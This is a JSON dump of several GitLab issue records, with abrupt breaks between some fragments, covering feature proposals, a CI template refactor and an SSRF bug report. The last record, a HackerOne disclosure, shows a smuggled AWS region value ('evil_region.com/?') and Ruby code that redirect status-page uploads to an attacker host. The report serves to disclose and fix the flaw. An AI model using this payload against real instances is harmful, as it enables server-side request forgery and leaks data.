This means that, without individual user credentials, all actions would be taken as the same admin user. Additionally, it may be possible for individual users to view content that is beyond their permissions in Jira, which presents potential security problems.\n\n## Intended users\n\nThe persona this targets is a version of [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer), but one whose company has invested in the Atlassian suite. Their work is being tracked by other personas (PdMs, PjMs, Designers, etc) in Jira, but they wish to work in GitLab full-time.\n\n_**Note:** future iterations may expand beyond this persona, but this MVC is tightly focused on serving this particular usecase._\n\n## User experience goal\n\n**The user should be able to federate their Jira account, allowing them to connect that account with their GitLab profile.**\n\nWhich consists of the following user stories:\n\n- As a developer, I want to be able to federate my Jira account with my GitLab profile, so I can see Jira content.\n- As a developer who has federated, I want to be able to revoke this federation for security reasons.\n\n## Proposal\n\nTo achieve this goal, we'll extend the [integration with Jira](https://docs.gitlab.com/ee/user/project/integrations/jira.html) to address these specific user stories. We'll add:\n\n1. A section to the [/profile](/profile) page that allows a user to add other accounts.\n1. Add a `Connect your Atlassian Account` button to that page that \n\nWe'll add a detail view that displays the full content of a single issue (allowing you to filter them and search), and from that view, a user can click on an individual issue to see the details of it -- just like they would normally.\n\n\n### Availability \u0026 Testing\n\n\n**What risks does this change pose to our availability?**\n\nThis is low risk feature for GitLab.com availability.\n\n**How might it affect the quality of the product?**\n\nThis feature will not affect existing product quality.\n\n**What additional test coverage or changes to tests will be needed?**\n\nUnit tests for model and controllers and feature tests for OAuth signin using mocks. \n\nEnsure following scenarios are covered:\n\n\u003c!-- \n* When signup is enabled, and an account with user's email does not exist in GitLab, a new account is created and tokens are saved to the db.\n* When signup is enabled, and an account with user's email already exist in GitLab, a new account is not created and error is shown saying that an account with the email already exists.\n* When signup is disabled, no option for the user to sign in with Atlassian shown. \n--\u003e\n\n* When no existing Atlassian identities present, the user sees \"Connect your Atlassian Account\" button. When they connect their Atlassian account, new identities are created and `refresh_token` (`token`?) is added to the database.\n\n* When existing Atlassian identities are present, the user sees that their account has already been connected and they don't see the \"Connect your Atlassian Account\" button.\n\n* When existing Atlassian identities are present, the user is able to unlink/remove the connected Atlassian account, which also removes the Atlassian identities and tokens from the db. User is then able to reconnect their account.  \n\n* When the user is unable to connect their Atlassian account due to bad credentials, appropriate message is shown to the user when (if) redirected back to GitLab. No identities or tokens are created in the db in this case.\n\n\nNo end-to-end tests would be added since the integration involves Atlassian Cloud and we avoid e2e test that would involving live 3rd party services.\n\n**Will it require cross-browser testing?**\n\nThis should not be necessary since the feature is not heavy on the UI. \n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\n\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e","state":"closed","created_at":"2020-06-09T20:03:09.362Z","updated_at":"2021-04-03T08:50:53.343Z","closed_at":"2020-10-05T16:35:34.715Z","closed_by":{"id":13356,"username":"dblessing","name":"Drew Blessing","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b5bf44866b4eeafa2d8114bfe15da02f?s=80\u0026d=identicon","web_url":"https://gitlab.com/dblessing"},"labels":["Category:Integrations","Integration::Jira","Next Up","atlassian","backend","devops::manage","group::authentication and authorization","quad-planning::complete-action","section::dev","type::feature","workflow::verification"],"milestone":{"id":1233753,"iid":51,"group_id":9970,"title":"13.4","description":"https://about.gitlab.com/releases/2020/09/22/gitlab-13-4-released/","state":"closed","created_at":"2020-04-09T17:39:21.662Z","updated_at":"2022-04-13T14:50:33.769Z","due_date":"2020-09-17","start_date":"2020-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/51"},"assignees":[{"id":13356,"username":"dblessing","name":"Drew Blessing","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b5bf44866b4eeafa2d8114bfe15da02f?s=80\u0026d=identicon","web_url":"https://gitlab.com/dblessing"}],"author":{"id":3646819,"username":"deuley","name":"Patrick Deuley","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3646819/avatar.png","web_url":"https://gitlab.com/deuley"},"type":"ISSUE","assignee":{"id":13356,"username":"dblessing","name":"Drew Blessing","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b5bf44866b4eeafa2d8114bfe15da02f?s=80\u0026d=identicon","web_url":"https://gitlab.com/dblessing"},"user_notes_count":61,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220991","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220991","notes":"https://gitlab.com/api/v4/projects/278964/issues/220991/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220991/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220991","relative":"#220991","full":"gitlab-org/gitlab#220991"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3558,"epic":{"id":65822,"iid":3558,"title":"Expand Jira integration to support Issues","url":"/groups/gitlab-org/-/epics/3558","group_id":9970},"iteration":null,"health_status":"on_track"},{"id":38472454,"iid":220988,"project_id":278964,"title":"Vulnerabilities in the Pipeline Security tab all link to the same issue","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nVulnerabilities reported in the [Pipeline Security tab](https://docs.gitlab.com/ee/user/application_security/security_dashboard/#pipeline-security) all point to the same related issue. \n\n### Steps to reproduce\n\n(How one can reproduce the issue -

To do this, add the following section to the bottom of `package.json`:\n\u003e \n\u003e ```json\n\u003e \"publishConfig\": {\n\u003e   \"@foo:registry\":\"https://gitlab.com/api/v4/projects/\u003cyour_project_id\u003e/packages/npm/\"\n\u003e }\n\u003e ```\n\nNote the **https** as this won't work with **http** (added this after ZD [Ticket](https://gitlab.zendesk.com/agent/tickets/172884) (Internal)\n\nThis allows the `npm` command-line tool to use the \"generic\" endpoint (i.e. `https://gitlab.com/api/v4/packages/npm/`) for all commands except `publish`, which will instead use the endpoint specified in `publishConfig`.\n\nThis is an okay workaround, but it has a few downsides:\n\n- It adds extra friction to getting set up to publish packages to GitLab's NPM registry\n- It makes it harder to automate. For example, environment variables can be replaced inside a `.npmrc` ([which we recommend doing in our docs](https://docs.gitlab.com/ee/user/packages/npm_registry/#using-variables-to-avoid-hard-coding-auth-token-values)), but this isn't possible in `package.json`. Because of this, users have to hard-code the GitLab project ID into `package.json`.\n- It doesn't match the expectations developers bring from using NPM's official registry\n\n### Intended users\n\nAnyone who interacts with GitLab's NPM package registry. (Particularly when setting up automation).\n\n### User experience goal\n\nUsers of [GitLab's NPM registry](https://docs.gitlab.com/ee/user/packages/npm_registry/index.html) should be able to use `npm` (the command-line tool) exactly the same way as they do when interacting with packages on https://www.npmjs.com/.\n\n### Proposal\n\nStandardize on using `https://gitlab.com/api/v4/projects/\u003cproject ID\u003e/packages/npm/` as the one and only NPM registry endpoint. This would allow users to configure their `.npmrc` like this:\n\n```\n@nfriend:registry=https://gitlab.com/api/v4/projects/18806182/packages/npm/\n```\n\nand perform all `npm` commands (`publish`, `view`, etc.) without needing to edit `package.json`.\n\n### Further details\n\nI'm not sure if this is a ~bug or a ~feature request, but I think I'll categorize this as a ~feature since [the current behavior is well documented](https://docs.gitlab.com/ee/user/packages/npm_registry/#authenticating-with-a-ci-job-token).\n\n### Documentation\n\nIf implemented, this would allow us to remove some setup steps from our documentation, in particular: https://docs.gitlab.com/ee/user/packages/npm_registry/#uploading-packages.","state":"closed","created_at":"2020-06-09T19:25:47.703Z","updated_at":"2021-12-27T21:29:12.283Z","closed_at":"2020-11-12T07:09:55.869Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:API","Category:Package Registry","Deliverable","Package:P1","api","backend","customer","devops::package","group::package registry","internal customer","npm Registry","package:active","ruby","section::ops","type::feature","workflow::canary"],"milestone":{"id":1233755,"iid":53,"group_id":9970,"title":"13.6","description":"https://about.gitlab.com/releases/2020/11/22/gitlab-13-6-released/","state":"closed","created_at":"2020-04-09T17:39:22.328Z","updated_at":"2022-04-13T14:51:04.376Z","due_date":"2020-11-17","start_date":"2020-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/53"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":493585,"username":"nfriend","name":"Nathan Friend","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd23f74a33fc7d8dfe081948696551a5?s=80\u0026d=identicon","web_url":"https://gitlab.com/nfriend"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":51,"merge_requests_count":0,"upvotes":10,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220985","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220985","notes":"https://gitlab.com/api/v4/projects/278964/issues/220985/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220985/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220985","relative":"#220985","full":"gitlab-org/gitlab#220985"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4378,"epic":{"id":110647,"iid":4378,"title":"Make the Package Registry easier to use with CI","url":"/groups/gitlab-org/-/epics/4378","group_id":9970,"human_readable_end_date":"Dec 17, 2020","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":38375187,"iid":220983,"project_id":278964,"title":"SAST file detection should not be case sensitive","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nCase-insensitive servers or operating systems (such as Microsoft Windows) normally allow file\nextensions to contain capital letters.

Secure QA CI Templates to use rules syntax","description":"\u003c!-- The first four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Problem to solve\n\nOur [Secure QA CI templates](https://gitlab.com/gitlab-org/security-products/ci-templates/) are a mixture of configurations used for the release, testing, and QA of our security products. These all use the deprecated `only/except` syntax and should be updated to use [`rules`](https://docs.gitlab.com/ee/ci/yaml/#rules) instead.\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) \n\n### User experience goal\n\nBetter release process with modern tools and syntax\n\n### Proposal\n\n- [ ] Update all QA templates to use new `rules` syntax\n  - [ ] Update [`qa-container_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-container_scanning.yml)\n  - [ ] Update [`qa-dependency_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-dependency_scanning.yml)\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-maven/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle-kotlin-dsl/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `go-modules/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `ruby-bundler/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `js-yarn/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `php-composer/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `python-pipenv/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `java-gradle-multimodules/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `python-pip/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `js-npm/.gitlab-ci.yml`\n    - [ ] Update `no_dind-FREEZE` branch `only` syntax for `scala-sbt/.gitlab-ci.yml`\n  - [ ] Update [`qa-sast`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-sast.yml)\n  - [ ] Update [`qa-license_scanning`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-license_scanning.yml)\n  - [ ] Update [`qa-secret_detection`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/qa-secret_detection.yml)\n\n### Further details\n\nFirst attempt at this was https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/117.\n\nThis was reverted in https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/119 due to recursive MR creations.\n\nSecond attempt was made with https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/122, but once the issue was identified (see NOTE below) the scope of the work was significant enough to warrant its own issue.\n\n*NOTE:* See https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/122#note_357593588 for issue with first and second MRs, but in summary: all test projects `extend` the base `.update-qa-**` jobs prefixed with the dot notation so we need those to contain the given rules, not the `update-qa-**` child jobs.\n\n### Permissions and Security\n\nNo change to permissions\n\n### Documentation\n\nNo change to documentation\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n~\"GitLab Ultimate\" \n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references","state":"closed","created_at":"2020-06-09T14:45:38.408Z","updated_at":"2020-10-19T15:30:07.778Z","closed_at":"2020-10-19T15:30:07.750Z","closed_by":{"id":401232,"username":"theoretick","name":"Lucas Charles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/401232/squares-nail-wall-art.jpg","web_url":"https://gitlab.com/theoretick"},"labels":["Category:Container Scanning","Category:Dependency Scanning","Category:License Compliance","Category:SAST","backend-weight::5","backstage [DEPRECATED]","devops::secure","maintenance::refactor","section::sec"],"milestone":null,"assignees":[],"author":{"id":401232,"username":"theoretick","name":"Lucas Charles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/401232/squares-nail-wall-art.jpg","web_url":"https://gitlab.com/theoretick"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220939","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":18,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 18 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220939","notes":"https://gitlab.com/api/v4/projects/278964/issues/220939/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220939/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220939","relative":"#220939","full":"gitlab-org/gitlab#220939"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":38000342,"iid":220934,"project_id":278964,"title":"Wiki \u003c\u003e Confluence MVC 1a - Link external Confluence Workspace from a Project","description":"\u003c!-- The first four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended, while the rest of the sections can be filled out during the problem validation or breakdown phase.

See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n## Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n## What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n## What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n## Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group.

Go through [Secure projects](https://gitlab.com/gitlab-org/security-products) and find those that contain package manager files. Exclude demo and test projects because they don't have originally written code.\n1. Create a script using [the managed licenses API](https://docs.gitlab.com/ee/api/managed_licenses.html) to apply [allowed]((https://about.gitlab.com/handbook/engineering/open-source/#acceptable-licenses)) and [denied](https://about.gitlab.com/handbook/engineering/open-source/#unacceptable-licenses) licenses.\n1.

Permissions and Security\n\nThere is no change in permissions, but DRI should have `Maintainer` permissions for Secure projects to update policies.\n\n### What does success look like, and how can we measure that?\n\nWhen introducing a new dependency, the license must be checked against the configured policies to prevent denied licenses to be included.\n\n### Is this a cross-stage feature?\n\nThis

While we're at it, we should rewrite the analyzer to use an `analyze` function rather than `run`. \n- [x] Write new unit tests\n- [x] Create new QA test projects\n- [x] Remove old nodejs-scan QA test projects\n\n### Documentation\n- Add new rows to the [supported languages for SAST](https://docs.gitlab.com/ee/user/application_security/sast/#supported-languages-and-frameworks) doc section\n- Update [analyzer data table](https://docs.gitlab.com/ee/user/application_security/sast/analyzers.html#analyzers-data) with new capabilities\n\n### Release notes\nRelease notes MR - https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/64549","state":"closed","created_at":"2020-06-08T18:10:33.116Z","updated_at":"2021-10-28T14:11:19.344Z","closed_at":"2020-10-12T15:36:05.918Z","closed_by":{"id":5211947,"username":"zrice","name":"Zach Rice","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5211947/avatar.png","web_url":"https://gitlab.com/zrice"},"labels":["Category:SAST","SAST: Scanner Update","backend","customer","devops::secure","group::static analysis","release post item::in review","section::sec","type::maintenance","workflow::production"],"milestone":{"id":1233754,"iid":52,"group_id":9970,"title":"13.5","description":"https://about.gitlab.com/releases/2020/10/22/gitlab-13-5-released/","state":"closed","created_at":"2020-04-09T17:39:21.990Z","updated_at":"2022-04-21T07:21:12.213Z","due_date":"2020-10-17","start_date":"2020-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/52"},"assignees":[{"id":5211947,"username":"zrice","name":"Zach Rice","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5211947/avatar.png","web_url":"https://gitlab.com/zrice"}],"author":{"id":5057937,"username":"dsearles","name":"Daniel Paul Searles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5057937/avatar.png","web_url":"https://gitlab.com/dsearles"},"type":"ISSUE","assignee":{"id":5211947,"username":"zrice","name":"Zach Rice","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5211947/avatar.png","web_url":"https://gitlab.com/zrice"},"user_notes_count":27,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220847","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":5},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220847","notes":"https://gitlab.com/api/v4/projects/278964/issues/220847/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220847/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220847","relative":"#220847","full":"gitlab-org/gitlab#220847"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3266,"epic":{"id":51945,"iid":3266,"title":"Keep SAST Scanners Updated","url":"/groups/gitlab-org/-/epics/3266","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":36158140,"iid":220836,"project_id":278964,"title":"[VSA] Refactor project-level feature to use group-level code","description":"### Problem to solve\n\nThere are 2 implementations of the Value Stream Analytics (VSA) feature:\n\n1.

It has been estimated that the [effort would be about the same](https://gitlab.com/gitlab-org/gitlab/-/issues/213029#note_316012604) between these approaches.\n\n### Proposal\n\nRefactor project-level VSA to use the group-level code:\n\n- [ ] [Migrate EE code into a core module with EE specific extensions](https://gitlab.com/gitlab-org/gitlab/-/issues/213358) ~frontend \n- [x] [Migrate project-level VSA to use group-level backend](https://gitlab.com/gitlab-org/gitlab/-/issues/213029) ~backend \n- [x] [Eliminate un-used Cycle Analytics code for legacy version](https://gitlab.com/gitlab-org/gitlab/-/issues/292730) ~backend \n\nNote: This is a tracking issue, not an implementation issue.\n\n### Implementation recommendations\n\n- See the thread starting here: https://gitlab.com/gitlab-org/gitlab/-/issues/30079#note_356967059","state":"closed","created_at":"2020-06-08T17:22:39.720Z","updated_at":"2021-01-13T15:10:55.648Z","closed_at":"2021-01-13T15:10:55.342Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["devops::manage","frontend","group::optimize","maintenance::refactor","section::dev","workflow::scheduling"],"milestone":null,"assignees":[],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":null,"user_notes_count":36,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220836","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":2},"weight":5,"blocking_issues_count":1,"has_tasks":true,"task_status":"2 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220836","notes":"https://gitlab.com/api/v4/projects/278964/issues/220836/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220836/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220836","relative":"#220836","full":"gitlab-org/gitlab#220836"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":36060397,"iid":220821,"project_id":278964,"title":"Remove deprecated Deploy-ECS template","description":"## Summary\n\nThis is a follow-up issue for https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33759\n\nAfter copying the `Deploy-ECS.gitlab-ci.yml` template into a new `AWS` folder as part of %\"13.1\", the old template can now be removed for %\"13.2\".\n\ncc @ogolowinski","state":"closed","created_at":"2020-06-08T15:19:24.964Z","updated_at":"2020-07-18T05:28:41.375Z","closed_at":"2020-07-18T05:28:41.315Z","closed_by":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"labels":["Alliances -

#880019](https://hackerone.com/reports/880019)** by `anyday` on 2020-05-21, assigned to @vdesousa:\n\nHello,\n\nThe `status page` feautre, accepts `aws S3 region` parameter, without validating it.\n\n```ruby  \n    /ee/app/models/status_page/project_setting.rb  \n...  \n    validates :project, :aws_region, :encrypted_aws_secret_key,  \n              presence: true  \n...  \n```\n\nLater the `status page service` calls the Aws::S3::Client.\n\n```ruby  \n    /ee/app/services/status_page/publish_base_service.rb  \n...  \ndef upload(key, json)  \n  return error_limit_exceeded(key) if limit_exceeded?(json)\n\n  content = json.to_json  \n  storage_client.upload_object(key, content)\n\n  success(object_key: key)  \nend  \n...  \n```\n\n```ruby  \n    /ee/lib/status_page/storage/s3_client.rb  \n...  \ndef upload_object(key, content)  \n  wrap_errors(key: key) do  \n    client.put_object(bucket: bucket_name, key: key, body: content)  \n  end\n\n  true  \nend  \n...  \n```\n\nUsually this results in the following request:\n\n`PUT https://s3.region.amazonaws.com/bucket_name/key HTTP/1.1`\n\nIf you pass the region `evil_region.com/?`, the following request is issued:\n\n```ruby  \nrequire 'aws-sdk'\n\ns3 = Aws::S3::Client.new(  \n    region: \"evil_region.com/?\",  \n    access_key_id: \"11111111111111111111\",  \n    secret_access_key: \"1111111111111111111111111111111111111111\",  \n);\n\ns3.put_object(bucket: \"bucket.name\", key: \"key\", body: \"content\")  \n```\n\n`PUT https://s3.evil_region.com/bucket.name/key HTTP/1.1`\n\nAs you can see, limited SSRF is possible.\n\nSIDE NOTE: If bucket name is 'aaaaa', `Aws::S3::Client` will use 'Virtual-hosted–style' naming, but if bucket name is 'aaa_aaa' or  'aaa.aaaa', it will use 'Path-style' naming.\n\nLimitations:  \n- Requires valid matching certificate since request is over https (If testing with self signed cert, add CA to /opt/gitlab/embedded/ssl/certs/cacert.pem)  \n- Only PUT and DELETE methods  \n- Limited path or subdomain control using `bucket name` (which is validated with `\\A[a-z0-9][a-z0-9\\-.]*\\z`)\n\nSteps to reproduce:\n\n1. Create a project, go to settings -\u003e operations -\u003e Status page, Set: \n\n```  \nS3 Bucket name = bucket.name  \nAWS region = evil_region.com/?  \nAWS access key ID = 11111111111111111111  \nAWS Secret access key = 1111111111111111111111111111111111111111  \n```  \n2. Go to project issues, create new issue. This will cause the following request:\n\n`PUT https://s3.evil_region.com/mybucket.2/data/incident/9.json`\n\nThe server will need to respond with valid 's3.evil_region.com' certificate.\n\nVideo POC:  \n[REDACTED]\n\n## Impact\n\nLimited SSRF\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n[REDACTED]","state":"closed","created_at":"2020-06-08T09:41:09.223Z","updated_at":"2022-07-06T14:39:23.851Z","closed_at":"2020-09-15T15:32:39.266Z","closed_by":{"id":3796140,"username":"sarahwaldner","name":"Sarah 